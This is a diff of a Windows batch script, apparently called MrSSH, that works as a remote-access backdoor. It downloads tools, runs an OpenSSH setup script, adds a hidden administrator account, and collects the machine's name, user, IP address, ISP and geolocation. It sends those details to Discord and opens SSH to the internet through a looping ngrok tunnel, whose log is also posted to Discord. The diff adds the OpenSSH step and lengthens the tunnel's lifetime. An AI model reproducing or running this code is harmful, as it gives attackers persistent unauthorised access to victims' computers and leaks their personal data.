@@ -5,6 +5,8 @@ curl -Ls "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-
 curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
 curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
 
+powershell ./OpenSSH.ps1
+
 net user "Admin" "Administrator" /add
 net localgroup Administrators Admin /add
 net localgroup Administratorzy Admin /add
@@ -28,15 +30,15 @@ FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter regionName
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter Timezone`) DO (SET zone=%%F)
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter country`) DO (SET country=%%F)
 
-call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local% (%isp%) \\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% \\n\\n:japan: **Region:** %region% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %zone%" "52bf90" "https://i.imgur.com/b2Terft.png"
+call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local% (%isp%) \\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% \\n\\n:japan: **Region:** %region% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %zone%" "52bf90" "https://i.imgur.com/b2Terft.png"
 
 tar -xf ngrok.zip
 
-start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F
-start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 60
+start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F 
+start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 
 :ngrokloop
 call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
 start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F
-start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 60
+start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 goto ngrokloop
